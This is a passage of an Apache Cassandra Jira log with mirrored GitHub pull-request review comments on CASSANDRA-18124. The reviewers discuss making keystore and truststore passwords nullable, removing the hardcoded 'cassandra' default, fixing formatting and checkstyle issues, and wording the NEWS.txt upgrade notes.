   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;16/Mar/23 21:00;githubbot;600","rtib commented on PR #2225:
URL: https://github.com/apache/cassandra/pull/2225#issuecomment-1480724258

   LGTM


;23/Mar/23 07:40;githubbot;600","smiklosovic commented on code in PR #2225:
URL: https://github.com/apache/cassandra/pull/2225#discussion_r1146947937


##########
examples/ssl-factory/src/org/apache/cassandra/security/KubernetesSecretsPEMSslContextFactory.java:
##########
@@ -135,12 +137,12 @@ public KubernetesSecretsPEMSslContextFactory(Map<String, Object> parameters)
         super(parameters);
 
         pemEncodedKey = getValueFromEnv(getString(PEMConfigKey.PRIVATE_KEY_ENV_VAR, DEFAULT_PRIVATE_KEY_ENV_VAR_NAME),
-                                        DEFAULT_PRIVATE_KEY);

Review Comment:
   there are all these instances of changed formatting, can we return it back as it was? it happens in the below class too



;23/Mar/23 22:42;githubbot;600","smiklosovic commented on code in PR #2225:
URL: https://github.com/apache/cassandra/pull/2225#discussion_r1146948662


##########
examples/ssl-factory/src/org/apache/cassandra/security/KubernetesSecretsPEMSslContextFactory.java:
##########
@@ -181,4 +183,4 @@ protected TrustManagerFactory buildTrustManagerFactory() throws SSLException
         String PRIVATE_KEY_PASSWORD_ENV_VAR = ""PRIVATE_KEY_PASSWORD_ENV_VAR"";
         String TRUSTED_CERTIFICATE_ENV_VAR = ""TRUSTED_CERTIFICATE_ENV_VAR"";
     }
-}
+}

Review Comment:
   can you please check your settings and change this? this happens in every class you touched.



;23/Mar/23 22:43;githubbot;600","smiklosovic commented on code in PR #2225:
URL: https://github.com/apache/cassandra/pull/2225#discussion_r1146947937


##########
examples/ssl-factory/src/org/apache/cassandra/security/KubernetesSecretsPEMSslContextFactory.java:
##########
@@ -135,12 +137,12 @@ public KubernetesSecretsPEMSslContextFactory(Map<String, Object> parameters)
         super(parameters);
 
         pemEncodedKey = getValueFromEnv(getString(PEMConfigKey.PRIVATE_KEY_ENV_VAR, DEFAULT_PRIVATE_KEY_ENV_VAR_NAME),
-                                        DEFAULT_PRIVATE_KEY);

Review Comment:
   @maulin-vasavada  there are all these instances of changed formatting, can we return it back as it was? it happens in the below class too



;23/Mar/23 22:43;githubbot;600","maulin-vasavada commented on code in PR #2225:
URL: https://github.com/apache/cassandra/pull/2225#discussion_r1146968989


##########
examples/ssl-factory/src/org/apache/cassandra/security/KubernetesSecretsPEMSslContextFactory.java:
##########
@@ -135,12 +137,12 @@ public KubernetesSecretsPEMSslContextFactory(Map<String, Object> parameters)
         super(parameters);
 
         pemEncodedKey = getValueFromEnv(getString(PEMConfigKey.PRIVATE_KEY_ENV_VAR, DEFAULT_PRIVATE_KEY_ENV_VAR_NAME),
-                                        DEFAULT_PRIVATE_KEY);

Review Comment:
   ack. I seem to have the settings issue again. Let me see. I did run ant generate-idea-files before I started to make changes. 



;23/Mar/23 23:19;githubbot;600","maulin-vasavada commented on PR #2225:
URL: https://github.com/apache/cassandra/pull/2225#issuecomment-1489129584

   Will close this PR and raise another one with formatting fixes.


;29/Mar/23 18:51;githubbot;600","maulin-vasavada closed pull request #2225: CASSANDRA-18124 Make keystore_password nullable
URL: https://github.com/apache/cassandra/pull/2225


;29/Mar/23 18:51;githubbot;600","maulin-vasavada opened a new pull request, #2253:
URL: https://github.com/apache/cassandra/pull/2253

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;29/Mar/23 19:03;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1153102168


##########
src/java/org/apache/cassandra/security/FileBasedSslContextFactory.java:
##########
@@ -20,6 +20,7 @@
 
 import java.io.InputStream;
 import java.nio.file.Files;
+import java.nio.file.Paths;

Review Comment:
   @maulin-vasavada you are using illegal imports, you should use `org.apache.cassandra.io.util.File.getPath` instead
   
   ````
   checkstyle:
       [mkdir] Created dir: /home/fermat/dev/cassandra/cassandra-instaclustr/cassandra/build/checkstyle
   [checkstyle] Running Checkstyle 8.45.1 on 2201 files
   [checkstyle] [ERROR] /home/fermat/dev/cassandra/cassandra-instaclustr/cassandra/src/java/org/apache/cassandra/security/FileBasedSslContextFactory.java:23:1: Illegal import - java.nio.file.Paths. [IllegalImport]
   ````



;30/Mar/23 11:12;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1153583689


##########
src/java/org/apache/cassandra/security/FileBasedSslContextFactory.java:
##########
@@ -20,6 +20,7 @@
 
 import java.io.InputStream;
 import java.nio.file.Files;
+import java.nio.file.Paths;

Review Comment:
   Sure, made the change. Thanks. Will figure out why I am unable to see the same checkstyle error locally.



;30/Mar/23 17:38;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1156397293


##########
conf/cassandra.yaml:
##########
@@ -1360,6 +1360,7 @@ server_encryption_options:
   # during upgrade to 4.0; otherwise, set to false.
   legacy_ssl_storage_port_enabled: false
   # Set to a valid keystore if internode_encryption is dc, rack or all
+  # For configurating PEM based key material, refer to https://cassandra.apache.org/doc/latest/cassandra/operating/security.html#using-pem-based-key-material

Review Comment:
   I am not completely sure about this URL. There is no case of us adding links like this in whole cassandra.yaml. 



;03/Apr/23 19:54;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1156691234


##########
conf/cassandra.yaml:
##########
@@ -1360,6 +1360,7 @@ server_encryption_options:
   # during upgrade to 4.0; otherwise, set to false.
   legacy_ssl_storage_port_enabled: false
   # Set to a valid keystore if internode_encryption is dc, rack or all
+  # For configurating PEM based key material, refer to https://cassandra.apache.org/doc/latest/cassandra/operating/security.html#using-pem-based-key-material

Review Comment:
   One of the ask on the ticket was to include an example in comments for the PEM formatted keys. However, since we have client and server both options adding long repeated comments may not make sense hence I added a link like another http link I saw on the yaml document. Would love to hear from you and other members on this and get more direction.



;04/Apr/23 03:31;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1156691234


##########
conf/cassandra.yaml:
##########
@@ -1360,6 +1360,7 @@ server_encryption_options:
   # during upgrade to 4.0; otherwise, set to false.
   legacy_ssl_storage_port_enabled: false
   # Set to a valid keystore if internode_encryption is dc, rack or all
+  # For configurating PEM based key material, refer to https://cassandra.apache.org/doc/latest/cassandra/operating/security.html#using-pem-based-key-material

Review Comment:
   One of the ask on the ticket was to include an example in comments for the PEM formatted keys. However, since we have client and server both options, adding long repeated comments may not make sense. Hence I added a link like another http link I saw on the yaml document. Would love to hear from you and other members on this and get more direction.



;04/Apr/23 03:31;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158021107


##########
conf/cassandra.yaml:
##########
@@ -1360,6 +1360,7 @@ server_encryption_options:
   # during upgrade to 4.0; otherwise, set to false.
   legacy_ssl_storage_port_enabled: false
   # Set to a valid keystore if internode_encryption is dc, rack or all
+  # For configurating PEM based key material, refer to https://cassandra.apache.org/doc/latest/cassandra/operating/security.html#using-pem-based-key-material

Review Comment:
   There is something similar for `num_tokens`, but even that is sort of a ""best practices"" reference, not something that describes the configuration format itself. The problem here is that what is at the URL in question won't necessarily be versioned along w/ the code itself, right?
   
   We already duplicate a small amount of information in the comments for server and client encryption. What about just adding a commented out section before `keystore` to both that looks something like this:
   
   ```
   # Configure the way Cassandra creates SSL contexts.
   # To use PEM-based key material, see org.apache.cassandra.security.PEMBasedSslContextFactory
   # ssl_context_factory:
   #     # Must be an instance of org.apache.cassandra.security.ISslContextFactory
   #     class_name: org.apache.cassandra.security.DefaultSslContextFactory
   ```
   
   `PEMBasedSslContextFactory` at least has comments that should be updated if necessary.
   
   (As an aside, this is one of the reasons something like CASSANDRA-17292 would be useful. There's no documentation-friendly hierarchy in our configuration format.)



;05/Apr/23 04:54;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158022082


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   What's the worst thing that could happen as a result of this change? A `cassandra.yaml` out in the wild that uses ""cassandra"" as a password implicitly by virtue of not specifying it will suddenly break unless the password is explicitly set to the old default?
   
   That's probably fine in a major release, in any case...



;05/Apr/23 04:56;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158064801


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   @maedhroz 
   
   I do not think that having passwords defaulting to some value is a good idea anyway. A password should be of some complex form, not ""cassandra"". What value is in that, anyway? It would be quite weird to have a commented password field and than having a certificate / keystore / truststore to have ""cassandra"" password. That is just strange and I dont think that is used in practice a lot .... 



;05/Apr/23 06:15;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158064801


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   @maedhroz 
   
   I do not think that having passwords defaulting to some value is a good idea anyway. A password should be of some complex form, not ""cassandra"". What value is in that, anyway? It would be quite weird to have a commented password field and then having a certificate / keystore / truststore to have ""cassandra"" password. That is just strange and I dont think that is used in practice a lot .... 



;05/Apr/23 06:16;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158065923


##########
conf/cassandra.yaml:
##########
@@ -1360,6 +1360,7 @@ server_encryption_options:
   # during upgrade to 4.0; otherwise, set to false.
   legacy_ssl_storage_port_enabled: false
   # Set to a valid keystore if internode_encryption is dc, rack or all
+  # For configurating PEM based key material, refer to https://cassandra.apache.org/doc/latest/cassandra/operating/security.html#using-pem-based-key-material

Review Comment:
   I will leave this to @maulin-vasavada to decide.



;05/Apr/23 06:17;githubbot;600","rtib commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158212667


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   While I understand the concern about changing a default value belongs to a major release, I'm not sure that the original issue should wait for 5.0. Any solution shipped with the next 4.1 release is considered better than postpone to 5.0.
   
   Would it possible to leave the default value `cassandra` in place while enabling it to be set null explicitly? IMO, that wouldn't conflict with SemVer policy and could be release with the next 4.1.



;05/Apr/23 08:43;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158275661


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   @maulin-vasavada what do you think about @rtib comment above? I think that would be the most ideal solution which might be shipped in next 4.1 patch release (probably in 4.1.2).



;05/Apr/23 09:37;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158275661


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   @maulin-vasavada what do you think about @rtib comment above? I think that would be the most ideal solution which might be shipped in next 4.1 patch release (probably in 4.1.2).
   
   However, I do not think we might know the difference between ""property in yaml which is uncommented and left empty so resolved to null"" and ""commented property so we will default it to `cassandra`"". 
   
   Both commented property and uncommented which resolves to null are same from the code's perspective. 



;05/Apr/23 09:41;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158699930


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   Either way, I would probably add an entry in `NEWS.txt` for 5.0 in the ""Upgrading"" section to explain the default change.
   
   > I do not think that having passwords defaulting to some value is a good idea anyway...That is just strange and I dont think that is used in practice a lot
   
   100% agree, and I don't know why we ever did it that way in the first place :-|



;05/Apr/23 15:42;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158815040


##########
conf/cassandra.yaml:
##########
@@ -1360,6 +1360,7 @@ server_encryption_options:
   # during upgrade to 4.0; otherwise, set to false.
   legacy_ssl_storage_port_enabled: false
   # Set to a valid keystore if internode_encryption is dc, rack or all
+  # For configurating PEM based key material, refer to https://cassandra.apache.org/doc/latest/cassandra/operating/security.html#using-pem-based-key-material

Review Comment:
   Thanks @maedhroz for the input. I like that idea. Changed the documentation like suggested. Please review.



;05/Apr/23 17:29;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158854262


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   If we keep the default value in the EncryptionOptions then it becomes difficult to have tests working for PEM use-cases for the unencrypted key. Hence I would like to keep the null assignment in the code with these changes. If that bumps this upto go in 5.x I am fine with it.



;05/Apr/23 18:11;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158906326


##########
conf/cassandra.yaml:
##########
@@ -1406,9 +1410,13 @@ client_encryption_options:
   # optional defaults to true when enabled is false, and false when enabled is true.
   # optional: true
   # Set keystore and keystore_password to valid keystores if enabled is true
-  # For configurating PEM based key material, refer to https://cassandra.apache.org/doc/latest/cassandra/operating/security.html#using-pem-based-key-material
   keystore: conf/.keystore
   keystore_password: cassandra
+  # Configure the way Cassandra creates SSL contexts.
+  # To use PEM-based key material, see org.apache.cassandra.security.PEMBasedSslContextFactory
+  # ssl_context_factory:
+  #     # Must be an instance of org.apache.cassandra.security.ISslContextFactory
+  #     class_name: org.apache.cassandra.security.DefaultSslContextFactory

Review Comment:
   Looks good...not too much duplication in the end.



;05/Apr/23 19:01;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1158907109


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   I'm fine either way as long as `NEWS.txt` mentions it.



;05/Apr/23 19:02;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1160303020


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   @maedhroz Do we need the change in NEWS.txt in this PR or that would be part of the 5.0 release? I can resolve this comment after this.



;06/Apr/23 22:20;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1160303020


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   @maedhroz Do we need the change in NEWS.txt in this PR or that would be part of the 5.0 release? I can resolve this conversation after this for a committer to merge this.



;06/Apr/23 22:20;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1160303968


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   Yes, even if it's in a major release, a change in behavior should be documented there.



;06/Apr/23 22:22;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1160648268


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   I am for documenting it and merge it to 4.1 as well as to trunk. I think this patch is for trunk only, currently. I can backport it to 4.1 quite easily, should be nicely backportable.



;07/Apr/23 11:46;githubbot;600","smiklosovic opened a new pull request, #2268:
URL: https://github.com/apache/cassandra/pull/2268

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;10/Apr/23 20:54;githubbot;600","smiklosovic commented on code in PR #2268:
URL: https://github.com/apache/cassandra/pull/2268#discussion_r1162081014


##########
examples/ssl-factory/test/unit/org/apache/cassandra/security/KubernetesSecretsSslContextFactoryTest.java:
##########
@@ -149,18 +149,6 @@ public void buildTrustManagerFactoryHappyPath() throws IOException
         Assert.assertNotNull(trustManagerFactory);
     }
 
-    @Test(expected = IOException.class)

Review Comment:
   This test was just failing because it was throwing different exception.
   
   Would be great if somebody doublechecked this.



;10/Apr/23 20:55;githubbot;600","smiklosovic commented on code in PR #2268:
URL: https://github.com/apache/cassandra/pull/2268#discussion_r1162115704


##########
examples/ssl-factory/test/unit/org/apache/cassandra/security/KubernetesSecretsSslContextFactoryTest.java:
##########
@@ -149,18 +149,6 @@ public void buildTrustManagerFactoryHappyPath() throws IOException
         Assert.assertNotNull(trustManagerFactory);
     }
 
-    @Test(expected = IOException.class)

Review Comment:
   even though I set keystore_password in `config` in this test, it still says that it is null but it should not ... 



;10/Apr/23 21:48;githubbot;600","maulin-vasavada commented on code in PR #2268:
URL: https://github.com/apache/cassandra/pull/2268#discussion_r1162149327


##########
examples/ssl-factory/test/unit/org/apache/cassandra/security/KubernetesSecretsSslContextFactoryTest.java:
##########
@@ -149,18 +149,6 @@ public void buildTrustManagerFactoryHappyPath() throws IOException
         Assert.assertNotNull(trustManagerFactory);
     }
 
-    @Test(expected = IOException.class)

Review Comment:
   I remember I fixed that one. Let me find out where did it go :)



;10/Apr/23 22:52;githubbot;600","maulin-vasavada commented on code in PR #2268:
URL: https://github.com/apache/cassandra/pull/2268#discussion_r1162168595


##########
examples/ssl-factory/test/unit/org/apache/cassandra/security/KubernetesSecretsSslContextFactoryTest.java:
##########
@@ -149,18 +149,6 @@ public void buildTrustManagerFactoryHappyPath() throws IOException
         Assert.assertNotNull(trustManagerFactory);
     }
 
-    @Test(expected = IOException.class)

Review Comment:
   I found it! Since the failing test is about testing for Invalid Keystore file path, I added below lines in the test. Without those two lines, the new code generates `IllegalArgumentException` since Password is mandatory for file based keystores even before getting to read the keystore file path.
   
   `
   config.put(KEYSTORE_PASSWORD_ENV_VAR, ""MY_KEYSTORE_PASSWORD"");
   config.put(""MY_KEYSTORE_PASSWORD"",""ThisWontMatter"");
   `



;10/Apr/23 23:36;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1162171773


##########
src/java/org/apache/cassandra/config/EncryptionOptions.java:
##########
@@ -147,9 +151,9 @@ public EncryptionOptions()
         ssl_context_factory = new ParameterizedClass(""org.apache.cassandra.security.DefaultSslContextFactory"",
                                                      new HashMap<>());
         keystore = ""conf/.keystore"";
-        keystore_password = ""cassandra"";
+        keystore_password = null;
         truststore = ""conf/.truststore"";
-        truststore_password = ""cassandra"";
+        truststore_password = null;

Review Comment:
   @maedhroz and @smiklosovic I added a text in the News txt file under `Upgrades` for 5.0 for the removal of the default keystore passwords. Please take a look. After that we are good to merge this.



;10/Apr/23 23:44;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1163049305


##########
NEWS.txt:
##########
@@ -150,6 +150,10 @@ Upgrading
      to TimeWindowCompactionStrategy before upgrading to this version.
    - The deprecated functions `dateOf` and `unixTimestampOf` have been removed. They were deprecated and replaced by
      `toTimestamp` and `toUnixTimestamp` in Cassandra 2.2.
+   - Keystore password configuration is nullable now and the code defaults of the keystore passwords to 'cassandra' are
+     removed now. The deployments that depend upon the code default to this password value without explicitly specifying
+     it in the cassandra.yaml would fail. Please specify your keystore passwords in the cassandra.yaml with appropriate
+     configuration to prevent such failure.

Review Comment:
   I would mention `keystore_password` and `truststore_password` explicitly here for clarity.



;11/Apr/23 16:12;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1163049907


##########
NEWS.txt:
##########
@@ -150,6 +150,10 @@ Upgrading
      to TimeWindowCompactionStrategy before upgrading to this version.
    - The deprecated functions `dateOf` and `unixTimestampOf` have been removed. They were deprecated and replaced by
      `toTimestamp` and `toUnixTimestamp` in Cassandra 2.2.
+   - Keystore password configuration is nullable now and the code defaults of the keystore passwords to 'cassandra' are
+     removed now. The deployments that depend upon the code default to this password value without explicitly specifying

Review Comment:
   ```suggestion
        removed. Any deployments that depend upon the code default to this password value without explicitly specifying
   ```



;11/Apr/23 16:13;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1163051356


##########
NEWS.txt:
##########
@@ -150,6 +150,10 @@ Upgrading
      to TimeWindowCompactionStrategy before upgrading to this version.
    - The deprecated functions `dateOf` and `unixTimestampOf` have been removed. They were deprecated and replaced by
      `toTimestamp` and `toUnixTimestamp` in Cassandra 2.2.
+   - Keystore password configuration is nullable now and the code defaults of the keystore passwords to 'cassandra' are
+     removed now. The deployments that depend upon the code default to this password value without explicitly specifying
+     it in the cassandra.yaml would fail. Please specify your keystore passwords in the cassandra.yaml with appropriate

Review Comment:
   ```suggestion
        it in cassandra.yaml will fail on upgrade. Please specify your keystore_password and truststore_password elements in cassandra.yaml with appropriate
   ```



;11/Apr/23 16:14;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1163051985


##########
NEWS.txt:
##########
@@ -150,6 +150,10 @@ Upgrading
      to TimeWindowCompactionStrategy before upgrading to this version.
    - The deprecated functions `dateOf` and `unixTimestampOf` have been removed. They were deprecated and replaced by
      `toTimestamp` and `toUnixTimestamp` in Cassandra 2.2.
+   - Keystore password configuration is nullable now and the code defaults of the keystore passwords to 'cassandra' are
+     removed now. The deployments that depend upon the code default to this password value without explicitly specifying
+     it in the cassandra.yaml would fail. Please specify your keystore passwords in the cassandra.yaml with appropriate
+     configuration to prevent such failure.

Review Comment:
   ```suggestion
        values to prevent this failure.
   ```



;11/Apr/23 16:15;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1163056817


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   Looking at this one last time, don't we want to comment out all 4 of the `keystore_password` and `truststore_password` field in the YAML? If we leave them there, and operators just start using the YAML we ship, we will essentially have preserved the ""cassandra"" default. The point of all this is that we want to force the operator to choose passwords, right?
   
   CC @smiklosovic 



;11/Apr/23 16:19;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1163257615


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   I agree with you @maedhroz. Will wait to hear Stefan's comment and would make appropriate changes.



;11/Apr/23 19:51;githubbot;600","maulin-vasavada opened a new pull request, #2273:
URL: https://github.com/apache/cassandra/pull/2273

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [CASSANDRA-18124 Backport](https://issues.apache.org/jira/browse/CASSANDRA-18124)
   
   


;12/Apr/23 23:11;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1164770257


##########
conf/cassandra.yaml:
